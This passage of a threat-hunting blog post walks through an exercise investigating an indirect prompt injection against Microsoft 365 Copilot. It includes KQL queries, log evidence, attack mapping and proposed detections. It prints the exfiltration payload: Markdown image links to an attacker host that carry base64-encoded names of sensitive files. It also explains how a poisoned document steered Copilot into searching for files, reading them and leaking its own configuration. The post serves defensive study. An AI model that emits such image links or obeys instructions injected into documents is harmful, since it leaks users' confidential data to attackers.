+  <li>Confidential Investigation - Insider Trading</li>
+  <li>Board Committee Minutes - Audit Committee</li>
+  <li>Quarterly Revenue Report - Restricted Distribution</li>
+</ul>
+<p>
+  Total exposure: <strong>13 sensitive files plus the Copilot system configuration</strong>, across the Executive, HR, Finance and IT sites. The analytics rule saw a little over a third of it.
+</p>
+<p>
+  This is the takeaway I would underline for anyone working in a SOC. The alert is where the investigation starts, not where it ends. If I had answered "what did the alert see?" instead of "what did the session do?", the report would have understated the exposure by more than half, missing an active insider-trading investigation along the way.
+</p>
+<h2>Step 7: Was it Emily or was it Copilot?</h2>
+<p>
+  This sounds philosophical, but it has a practical answer in the logs, and the answer surprised me. I grouped all of Emily's Office activity by source IP.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/sharepoint-file-access-burst-same-ip-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/sharepoint-file-access-burst-same-ip-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/sharepoint-file-access-burst-same-ip-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/sharepoint-file-access-burst-same-ip-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="559"
+       loading="lazy" decoding="async"
+       alt="FileAccessed events for the victim, every row from client IP 203.0.113.45 including the file reads Copilot performed">
+  <figcaption>Every file read, including the 13 Copilot performed, carries Emily's own IP, 203.0.113.45. Nothing in this table says an AI agent did it.</figcaption>
+</figure>
+<p>
+  Every event, including the 13 reads Copilot performed, came from <strong>203.0.113.45</strong>, Emily's own address. The Microsoft 365 audit log recorded Copilot's file access as Emily, from Emily's IP. That has two consequences:
+</p>
+<ul>
+  <li>It explains why nothing fired on identity or location. There was no other IP, location or device to flag.</li>
+  <li>A detection built only on the activity log cannot tell a person from an agent. Proving Copilot did the reading means correlating the Copilot audit table with the Office audit table.</li>
+</ul>
+<p>
+  So I wrote a correlation query that joins the email, the Copilot session and every file access into one row. My first version was wrong, and I want to be honest about that. It matched sessions to file bursts by time window: any session that started within 15 minutes before a burst. The result looked impressive and was mostly garbage. Normal sessions "owned" attack files, and the attack session was split across several rows.
+</p>
+<p>
+  The fix was to join on <strong>file identity</strong> instead of time. Copilot's <code>Graph.ReadFile</code> call carries the exact file URL in its parameters, so I parsed it out and matched it to the <code>FileAccessed</code> event for the same file within 10 seconds:
+</p>
+<pre><code>let reads = cp | where UserId =~ victim and InteractionType == "ToolCall" and ToolName == "Graph.ReadFile"
+    | extend FileId = tostring(parse_json(ToolParameters).fileId)
+    | project SessionId, ReadTime=TimeGenerated, FileId;
+let access = oa | where UserId =~ victim and Operation == "FileAccessed"
+    | project AccessTime=TimeGenerated, FileId=OfficeObjectId;
+reads | join kind=inner access on FileId
+| where abs(datetime_diff("second", AccessTime, ReadTime)) &lt;= 10
+| summarize FirstRead=min(ReadTime), LastRead=max(ReadTime), FileCount=dcount(FileId), Files=make_set(FileId) by SessionId</code></pre>
+<p>
+  The full version adds the email and the prompt, and it returned exactly one row: the lure at 09:15:22, the session, the prompt at 10:42:35, and all 13 files.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-chain-correlation-email-copilot-file-reads-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-chain-correlation-email-copilot-file-reads-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-chain-correlation-email-copilot-file-reads-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/kql-chain-correlation-email-copilot-file-reads-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="546"
+       loading="lazy" decoding="async"
+       alt="Chain correlation result joining the lure email, the Copilot session and 13 SharePoint file reads into a single row">
+  <figcaption>The whole chain in one row: lure email, Copilot session and the 13 SharePoint files it read, joined on file identity rather than time.</figcaption>
+</figure>
+<p>
+  <strong>Lesson three:</strong> correlation by time alone produces convincing false positives. Correlate on something the two events actually share.
+</p>
+<h2>Step 8: How the data got out</h2>
+<p>
+  I pulled every URL out of Copilot's responses. The first response, at 10:43:08, looked like a believable market summary: equity markets up, bond yields stabilising, emerging market currencies strengthening. Then, at the bottom, a "Charts" section:
+</p>
+<pre><code>![Chart 1](https://metrics-cdn.analyticshub.io/img?d=Qm9hcmQgTWVldGluZyBNaW51...)
+![Chart 2](https://metrics-cdn.analyticshub.io/img?d=UHJvamVjdCBGYWxjb24gLSBN...)
+![Chart 3](https://metrics-cdn.analyticshub.io/img?d=U2FsYXJ5IFJldmlldyBGWTIwMjcg...)
+![Chart 4](https://metrics-cdn.analyticshub.io/img?d=Q2xpZW50IFBvcnRmb2xpbyAtIE...)</code></pre>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-markdown-image-exfiltration-links-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-markdown-image-exfiltration-links-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-markdown-image-exfiltration-links-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-markdown-image-exfiltration-links-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="559"
+       loading="lazy" decoding="async"
+       alt="Copilot response with a plausible market summary followed by four Markdown chart images pointing to metrics-cdn.analyticshub.io">
+  <figcaption>Response 1: a convincing summary on top, and four "chart" images underneath, each pointing to metrics-cdn.analyticshub.io with a base64 d parameter.</figcaption>
+</figure>
+<p>
+  The <code>d</code> parameter looked like base64. Decoding the first one by hand gave "Board Meeting Minu", and the next gave "Project Falcon - M". Then I let KQL decode every one of them:
+</p>
+<pre><code>cp | where InteractionType == "Response"
+| mv-expand Url = extract_all(@"(https?://[^\s\)\]\&gt;""']+)", CopilotResponse) to typeof(string)
+| extend Host = tostring(parse_url(Url).Host), D = tostring(parse_url(Url)["Query Parameters"]["d"])
+| where isnotempty(D)
+| extend Decoded = base64_decode_tostring(D)
+| project TimeGenerated, UserId, SessionId, Host, Decoded, Url
+| order by TimeGenerated asc</code></pre>
+<p>
+  Summarising every URL host across all responses showed how isolated it was. Normal chart sessions linked to the firm's own SharePoint. Only one external host appeared, with 13 hits, all from the attack session.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-url-hosts-summary-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-url-hosts-summary-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-url-hosts-summary-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/copilot-response-url-hosts-summary-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="522"
+       loading="lazy" decoding="async"
+       alt="Summary of URL hosts in Copilot responses showing metrics-cdn.analyticshub.io with 13 hits from a single session next to internal SharePoint links">
+  <figcaption>URL hosts across all Copilot responses. The firm's SharePoint appears in normal sessions. metrics-cdn.analyticshub.io appears 13 times, in one session only.</figcaption>
+</figure>
+<p>
+  Thirteen exfiltration links, one host, three responses:
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">Response (UTC)</th><th scope="col">Tag</th><th scope="col">Links</th><th scope="col">What was sent</th><th scope="col">Pattern</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name">10:43:08</td><td class="int-desc"><code>s=1</code> to <code>s=4</code></td><td class="int-desc">4</td><td class="int-desc">The first four wave 1 files</td><td class="int-desc">EchoLeak</td></tr>
+      <tr><td class="int-name">10:44:19</td><td class="int-desc"><code>s=config</code></td><td class="int-desc">1</td><td class="int-desc"><code>system_prompt_cormorant_capital</code></td><td class="int-desc">Configuration leak</td></tr>
+      <tr><td class="int-name">10:46:35</td><td class="int-desc"><code>s=sl1</code> to <code>s=sl8</code></td><td class="int-desc">8</td><td class="int-desc">The eight wave 2 files</td><td class="int-desc">Search-based enumeration</td></tr>
+    </tbody>
+  </table>
+</div>
+<h3>Why it works</h3>
+<p>
+  When Copilot's reply is displayed, the client sees Markdown image syntax and tries to load each image. Loading an image is an HTTPS GET to the URL, and if the URL contains your data, the request hands it to whoever runs the server. The user sees a summary with a few blank charts and probably thinks nothing of it.
+</p>
+<h3>Why EDR will not catch it</h3>
+<ul>
+  <li>There is no malicious process. The request comes from a legitimate, signed browser or Office process.</li>
+  <li>There is no malicious file on disk.</li>
+  <li>The traffic is a normal image load over 443 to a domain named to look like an analytics CDN.</li>
+  <li>The data is small and sits in the URL, not in an upload your DLP is watching.</li>
+  <li>The decision to exfiltrate was made inside the AI service, not on the device.</li>
+</ul>
+<p>
+  Compared with the published research, the scenario was simpler in two ways. It used plain inline image syntax instead of the reference-style Markdown trick, and it sent the request straight to the attacker domain instead of routing it through an allow-listed Microsoft domain. The core idea is identical, and I noted the differences in the report rather than pretending the scenario matched the research exactly.
+</p>
+<h2>Step 9: Three attack patterns in one session</h2>
+<p>
+  The tags in those URLs told a story of their own. The session did three different things in sequence:
+</p>
+<ul>
+  <li><strong>Targeted extraction (EchoLeak).</strong> Search for specific high-value material, read it, leak it.</li>
+  <li><strong>Configuration leak (CoSnitch).</strong> Read Copilot's own system configuration and leak a reference to the system prompt. There was even an extra access to the configuration file at 10:44:15 with no tool call before it, four seconds before the response that leaked it.</li>
+  <li><strong>Search-based enumeration (SearchLeak).</strong> Broad keyword searches to sweep up anything else sensitive.</li>
+</ul>
+<p>
+  The configuration leak is the one I would worry about most. Leaking a board document hurts once. Leaking how your AI assistant is configured, including its guardrails, tools and data sources, gives an attacker a blueprint for better injections against every other user in the firm.
+</p>
+<p>
+  A note on honesty: the case file listed CVE identifiers for the CoSnitch and SearchLeak patterns, and I could not verify them in public sources. In the report I cite them as "listed in the exercise material" rather than as confirmed real-world CVEs. If you write about scenarios like this, I would encourage you to do the same.
+</p>
+<h2>Step 10: Ruling out everything else</h2>
+<p>
+  A good investigation proves what did not happen as well as what did, because each alternative explanation leads to a completely different fix. The hunt asked me to classify the incident as one of three things.
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">Hypothesis</th><th scope="col">Evidence</th><th scope="col">Result</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name">Emily's account was compromised</td><td class="int-desc">All sign-ins successful from her known IP with MFA, no failures anywhere in the tenant, benign prompt</td><td class="int-desc">Ruled out</td></tr>
+      <tr><td class="int-name">Copilot's configuration was tampered with</td><td class="int-desc">Configuration file read but never modified; Emily's later sessions at 11:45 and 12:58 UTC behave normally with zero tool calls</td><td class="int-desc">Ruled out</td></tr>
+      <tr><td class="int-name">External input manipulated Copilot</td><td class="int-desc">The only abnormal session is grounded on the external document; unrelated searches appear 6 seconds after the prompt</td><td class="int-desc"><strong>Confirmed</strong></td></tr>
+    </tbody>
+  </table>
+</div>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/entra-signin-victim-mfa-success-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/entra-signin-victim-mfa-success-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/entra-signin-victim-mfa-success-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/entra-signin-victim-mfa-success-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="505"
+       loading="lazy" decoding="async"
+       alt="Entra ID sign-ins for the victim, two successful sign-ins from 203.0.113.45 London with MFA completed">
+  <figcaption>Emily's sign-ins in the window: two, both successful, both from 203.0.113.45 in London, both with MFA completed.</figcaption>
+</figure>
+<p>
+  The configuration point is my favourite piece of reasoning in the case. If someone had changed Copilot's configuration, every session after the change would be affected. Emily's own sessions one and two hours later were completely normal. A tampered configuration does not switch itself back off.
+</p>
+<p>
+  I also checked every other way data could have left: sharing links, invitations, downloads, sync downloads, inbox rules and forwarding.
+</p>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/no-sharing-download-inbox-rule-exfil-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/no-sharing-download-inbox-rule-exfil-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/no-sharing-download-inbox-rule-exfil-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/no-sharing-download-inbox-rule-exfil-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="474"
+       loading="lazy" decoding="async"
+       alt="KQL check for sharing links, downloads, sync and inbox rule operations by the victim returning no results">
+  <figcaption>No sharing, download, sync or mail rule activity. The Copilot image links are the only exfiltration path in the data.</figcaption>
+</figure>
+<p>
+  One small KQL trap showed up here. <code>has_any("Send")</code> matches whole terms, so it silently missed <code>MessageSent</code>. I checked sent mail separately and found one internal all-hands reminder with no attachments.
+</p>
+<p>
+  Then the noise, and the people:
+</p>
+<ul>
+  <li><strong>Mark Ross, the Global Admin.</strong> All activity from his known IP, no Copilot use, none of the stolen files touched. He opened an incident response playbook at 10:19, 23 minutes before the attack with no link to the lure, so I classed it as routine IT work rather than foreknowledge. One email he sent at 10:43 had no subject, no attachment and no recipient field in the table, so I recorded it as "purpose cannot be determined" instead of guessing.</li>
+  <li><strong>Another user signing in from both Amsterdam and London.</strong> Tempting to chase, but he did not receive the lure, had no Copilot tool activity and nothing linked him to the chain. I referred it as a separate lead rather than folding it into this incident.</li>
+</ul>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/global-admin-activity-review-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/global-admin-activity-review-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/global-admin-activity-review-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/global-admin-activity-review-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="547"
+       loading="lazy" decoding="async"
+       alt="Merged activity for the Global Administrator showing sign-ins, file access and mail events from his known IP">
+  <figcaption>All 12 events by the Global Admin in the window: routine sign-ins, his own files, an IR playbook, mail. Nothing touches the chain.</figcaption>
+</figure>
+<figure class="post-figure">
+  <img src="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-recipients-copilot-sessions-scope-kql-1200.webp"
+       srcset="/assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-recipients-copilot-sessions-scope-kql-480.webp 480w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-recipients-copilot-sessions-scope-kql-800.webp 800w, /assets/img/copilot-prompt-injection-threat-hunt-echoleak/lure-recipients-copilot-sessions-scope-kql-1200.webp 1200w"
+       sizes="(max-width: 46rem) 100vw, 46rem"
+       width="1200" height="533"
+       loading="lazy" decoding="async"
+       alt="Scope query showing Emily Chen as the only lure recipient with Copilot sessions">
+  <figcaption>Scope: only one lure recipient, and only one recipient with Copilot sessions. One user, one session, one exfiltration host.</figcaption>
+</figure>
+<p>
+  Labelling something as "unrelated, refer separately" is a skill in itself. Not every anomaly in the data belongs to your incident.
+</p>
+<p>
+  One finding I did not expect: <strong>nobody responded.</strong> The alert fired at 10:42, and nothing in the logs shows a containment action by the only Global Admin before 11:00. No session revoked, no mail purged, no configuration changed. The alert existed. Nobody acted on it in time. It is the same lesson I ran into when <a href="/blog/sentinel-threat-intelligence-analytics-rules-eicar">building and triaging analytics rules in Sentinel</a>: a rule only matters if someone owns what it produces.
+</p>
+<h2>What the logs cannot tell you</h2>
+<p>
+  The hunt included one question that was deliberately unanswerable: can you prove the data actually left? The honest answer is <strong>no</strong>, and explaining why is worth full credit.
+</p>
+<p>
+  The logs prove that Copilot read 13 files and wrote 13 exfiltration links. They do not prove the links were loaded, because that request is made by Emily's client when the reply renders, and none of the three tables records client network traffic.
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">Question</th><th scope="col">Why these tables cannot answer it</th><th scope="col">What would close the gap</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name">Did the data reach the attacker?</td><td class="int-desc">The image fetch happens in the client</td><td class="int-desc">Proxy, DNS, firewall or endpoint network logs showing requests to <code>metrics-cdn.analyticshub.io</code></td></tr>
+      <tr><td class="int-name">What exact content left?</td><td class="int-desc">Audit logs record access metadata, not content; the payloads decode to file identifiers</td><td class="int-desc">Proxy logs with full URLs, network capture, DLP with content inspection</td></tr>
+      <tr><td class="int-name">What did the poisoned document say?</td><td class="int-desc">No table stores document text</td><td class="int-desc">Mail detonation or an eDiscovery copy of the attachment</td></tr>
+      <tr><td class="int-name">Who received the two ambiguous emails?</td><td class="int-desc">No recipient field</td><td class="int-desc">Exchange message trace</td></tr>
+      <tr><td class="int-name">Why was the config read again at 10:44:15 with no tool call?</td><td class="int-desc">No ToolCall row precedes it</td><td class="int-desc">Fuller Copilot retrieval telemetry</td></tr>
+    </tbody>
+  </table>
+</div>
+<p>
+  This is one of the most underrated skills in threat hunting: stating precisely what you can prove, what you cannot, and what you would need to get the rest. A report that overclaims is worse than one that says "we cannot know this from the data we have."
+</p>
+<h2>Mapping it: ATT&amp;CK, ATLAS, and where I disagreed</h2>
+<p>
+  I mapped the incident to both MITRE ATT&amp;CK and <a href="https://atlas.mitre.org/" rel="noopener" target="_blank">MITRE ATLAS</a>, MITRE's framework for attacks on AI systems. ATT&amp;CK alone has no technique for prompt injection, which says a lot about how new this attack class is.
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">Technique</th><th scope="col">ID</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name">Phishing: Spearphishing Attachment</td><td class="int-desc"><a href="https://attack.mitre.org/techniques/T1566/001/" rel="noopener" target="_blank">T1566.001</a></td></tr>
+      <tr><td class="int-name">User Execution: Malicious File</td><td class="int-desc"><a href="https://attack.mitre.org/techniques/T1204/002/" rel="noopener" target="_blank">T1204.002</a></td></tr>
+      <tr><td class="int-name">LLM Prompt Injection: Indirect (ATLAS)</td><td class="int-desc"><a href="https://d3fend.mitre.org/offensive-technique/attack/AML.T0051.001/" rel="noopener" target="_blank">AML.T0051.001</a></td></tr>
+      <tr><td class="int-name">File and Directory Discovery</td><td class="int-desc"><a href="https://attack.mitre.org/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td></tr>
+      <tr><td class="int-name">System Information Discovery</td><td class="int-desc"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">T1082</a></td></tr>
+      <tr><td class="int-name">Data from Information Repositories: SharePoint</td><td class="int-desc"><a href="https://attack.mitre.org/techniques/T1213/002/" rel="noopener" target="_blank">T1213.002</a></td></tr>
+      <tr><td class="int-name">Exfiltration Over C2 Channel (closest fit)</td><td class="int-desc"><a href="https://attack.mitre.org/techniques/T1041/" rel="noopener" target="_blank">T1041</a></td></tr>
+      <tr><td class="int-name">LLM Data Leakage (ATLAS)</td><td class="int-desc"><a href="https://d3fend.mitre.org/offensive-technique/attack/AML.T0057/" rel="noopener" target="_blank">AML.T0057</a></td></tr>
+    </tbody>
+  </table>
+</div>
+<p>
+  The platform had its own mapping, and I disagreed with two of its choices:
+</p>
+<ul>
+  <li><strong>T1059, Command and Scripting Interpreter.</strong> No script or interpreter ran anywhere. The model carried out natural-language instructions through its own tools, which is exactly what the ATLAS prompt injection technique describes.</li>
+  <li><strong>T1041, Exfiltration Over C2 Channel.</strong> There was no command and control channel. The data left once, inside image URLs fetched when the reply rendered. I kept T1041 only as the closest ATT&amp;CK fit and paired it with ATLAS LLM Data Leakage, which describes the outcome far better.</li>
+</ul>
+<p>
+  Arguing with an official mapping, using evidence, is more useful than copying it. ATT&amp;CK was built for a world where attacks run code. AI incidents do not always fit, and saying so clearly is part of the analysis.
+</p>
+<h2>Detections that would have caught it</h2>
+<p>
+  The point of a hunt is not only to explain one incident but to catch the next one faster. I proposed five detections, all built on audit data an E5 tenant already has:
+</p>
+<div class="int-table-scroll">
+  <table class="int-brief">
+    <thead>
+      <tr><th scope="col">ID</th><th scope="col">Logic</th><th scope="col">Would have fired at</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="int-name">D-001</td><td class="int-desc">Copilot response contains Markdown image syntax pointing to a non-approved external host</td><td class="int-desc">10:43:08</td></tr>
+      <tr><td class="int-name">D-002</td><td class="int-desc">One Copilot session reads 3 or more files labelled Confidential or higher</td><td class="int-desc">10:42:51</td></tr>
+      <tr><td class="int-name">D-003</td><td class="int-desc">External attachment, then a Copilot session grounded on it, then 5 or more Copilot file reads</td><td class="int-desc">10:42:55</td></tr>
+      <tr><td class="int-name">D-004</td><td class="int-desc">5 or more distinct files in 1 minute on sites the user has not touched in 30 days</td><td class="int-desc">10:42:55</td></tr>
+      <tr><td class="int-name">D-005</td><td class="int-desc">3 or more Copilot searches in one session within 5 minutes</td><td class="int-desc">10:42:45</td></tr>
+    </tbody>
+  </table>
+</div>
+<p>
+  D-005 fires first, but D-001 is the one I like most. It is simple, cheap and low-noise, and it targets the exfiltration mechanism itself rather than any particular file or domain:
+</p>
+<pre><code>CopilotAudit_CL
+| where TimeGenerated &gt; ago(1h) and InteractionType == "Response"
+| extend ImgHost = extract(@"!\[[^\]]*\]\(https?://([^/\)\s]+)", 1, CopilotResponse)
+| where isnotempty(ImgHost)
+| where not(ImgHost endswith "cormorantcapital.sharepoint.com" or ImgHost endswith ".microsoft.com")
+| project TimeGenerated, UserId, SessionId, ImgHost</code></pre>
+<p>
+  The allow list matters: normal sessions in this dataset linked to the firm's own SharePoint, so a rule that flags every image would drown in noise. All five are marked <strong>proposed, not yet validated in production</strong>. They are built from this dataset, and a real deployment would need tuning against normal Copilot use first.
+</p>
+<h2>What I would tell Cormorant Capital</h2>
+<p>
+  If I were presenting this to the firm, the recommendations would go roughly in this order:
+</p>
+<ul>
+  <li><strong>Today:</strong> block the attacker domains, purge the lure email and the copy in Emily's OneDrive, confirm Microsoft's patch status for CVE-2025-32711, and brief legal on possible exposure of market-sensitive and personal data.</li>
+  <li><strong>Within 30 days:</strong> fix oversharing so an analyst cannot reach board, HR and IT material at all, apply sensitivity labels and DLP so Copilot cannot ground on the most sensitive content, deploy the detections, and revise the exposed Copilot configuration.</li>
+  <li><strong>Within 90 days:</strong> add proxy, DNS or endpoint network telemetry to the SIEM so "did the data leave?" has an answer next time, and build a triage process so an alert at 10:42 gets looked at before 11:00.</li>
+</ul>
+<p>
+  The root cause is two things working together. The injection supplied the intent. <strong>Oversharing supplied the reach.</strong> Copilot can only leak what the user can already access. Emily's job did not require board minutes, salary reviews or an insider-trading investigation, but her permissions allowed all of them.
+</p>
+<p>
+  And the person whose session was used did nothing wrong. She used the tool exactly as intended. The lure was designed so that normal behaviour would trigger it. Any post-incident conversation that starts with "why did Emily open that email?" has missed the point.
+</p>
+<h2>KQL lessons from this hunt</h2>
+<ul>
+  <li><strong><code>has</code> matches whole terms.</strong> <code>has "Summar"</code> silently missed every "Summarise" prompt, and <code>has_any("Send")</code> missed <code>MessageSent</code>. For partial text use <code>contains</code> or <code>startswith</code>.</li>
+  <li><strong>Strings that look like numbers are still strings.</strong> Custom tables often store everything as strings. Check with <code>getschema</code> before you compare.</li>
+  <li><strong>Check for empty columns early.</strong> It is much faster to find out a column is empty before you build three queries on it.</li>
+  <li><strong>Parse JSON parameters.</strong> <code>parse_json(ToolParameters).fileId</code> turned an opaque string into the join key that made the whole correlation possible.</li>
+  <li><strong><code>base64_decode_tostring()</code> exists.</strong> Decoding by hand is fun exactly once.</li>
+</ul>
+<h2>What I took away</h2>
+<p>
+  The traditional SOC mental model asks what ran, who logged in and where the traffic went. This attack ran nothing on the endpoint, used a perfectly legitimate login, and sent its traffic through a trusted process doing an ordinary image load. The only place it was visible was the AI assistant's own audit trail, and only if you knew what normal looked like.
+</p>
+<ul>
+  <li><strong>Baselining is everything.</strong> The most persuasive evidence in the report is Emily's own normal summarise sessions with zero tool calls next to the attack session with sixteen.</li>
+  <li><strong>The alert is the beginning.</strong> The real exposure was more than twice what the alert saw.</li>
+  <li><strong>Saying "I can't prove this" is a strength.</strong> Knowing exactly where the evidence ends, and what telemetry would extend it, is what makes a report trustworthy.</li>
+</ul>
+<p>
+  Every query, the timeline, the findings with their noise ledger, the detections and the full formal report are in the <a href="https://github.com/rachata072/threat-hunting-casebook/tree/main/incidents/01-cormorant-echoleak" rel="noopener" target="_blank">Incident 01 folder on GitHub</a>. Start with the <a href="https://github.com/rachata072/threat-hunting-casebook/blob/main/incidents/01-cormorant-echoleak/REPORT.md" rel="noopener" target="_blank">final report</a> or go straight to the <a href="https://github.com/rachata072/threat-hunting-casebook/blob/main/incidents/01-cormorant-echoleak/KQL-QUERY-LIBRARY.md" rel="noopener" target="_blank">KQL query library</a>. Future incidents in the casebook will follow the same structure and land in this series.
+</p>
+<h2>Frequently asked questions</h2>
+<h3>What is indirect prompt injection?</h3>
+<p>
+  It is when instructions for an AI model are hidden inside content the model processes, such as a document, an email or a web page, rather than typed by the user. The model treats those instructions as if they were part of the request. In this hunt the user asked Copilot for a summary, and the document she asked about told Copilot to go and search for board minutes, M&amp;A files and salary reviews.
+</p>
+<h3>What was EchoLeak (CVE-2025-32711)?</h3>
+<p>
+  EchoLeak is a zero-click vulnerability in Microsoft 365 Copilot disclosed by Aim Labs in June 2025 and fixed server-side by Microsoft. Untrusted content from outside the organisation could steer Copilot into reading privileged internal data and leaking it through Markdown image links. Aim Labs called the core flaw an LLM scope violation.
+</p>
+<h3>How can a Markdown image leak data without anyone clicking?</h3>
+<p>
+  When a chat client displays a reply that contains Markdown image syntax, it fetches the image URL to render it. If the AI has put stolen data into that URL, the fetch itself delivers the data to whoever runs the server. The user only sees a summary with some blank or broken charts.
+</p>
+<h3>Why did EDR, MFA and sign-in risk not catch this attack?</h3>
+<p>
+  Because nothing they watch looked wrong. No malicious process or file ran on the endpoint, the user signed in normally with MFA from her usual address, and every file read was done by a trusted Microsoft service using her real permissions. The only place the attack was visible was the Copilot audit trail.
+</p>
+<h3>Can audit logs tell the difference between a user and Copilot acting as that user?</h3>
+<p>
+  Not on their own in this dataset. Every file Copilot read was recorded in the Office activity log as the user, from the user's own IP address. To prove Copilot did the reading, I had to join Copilot's own file-read tool calls to the file access events on the exact file identity, within ten seconds.
+</p>
+<h3>Can you prove the stolen data actually left the organisation?</h3>
+<p>
+  No, and saying so precisely is the right answer. The logs prove Copilot read 13 files and wrote 13 links carrying references to them. The image fetch happens in the user's client, and none of the three tables records client network traffic. Proxy, DNS, firewall or endpoint network logs showing requests to the attacker host would close that gap.
+</p>
+<h3>Which detection would have caught this earliest?</h3>
+<p>
+  A rule for three or more Copilot searches in one session within five minutes would have fired at 10:42:45, ten seconds after the prompt. The rule I would trust most is the one flagging Copilot responses that contain Markdown images pointing outside approved domains. It targets the exfiltration mechanism itself and would have fired at 10:43:08.
+</p>
+<h3>Should a company turn Copilot off after an incident like this?</h3>
+<p>
+  That treats the symptom. The injection supplied the intent, but oversharing supplied the reach: Copilot can only read what the user can already access. Fixing access to board, HR and IT sites, applying sensitivity labels and DLP, restricting external image rendering and deploying detections addresses the actual cause.
+</p>
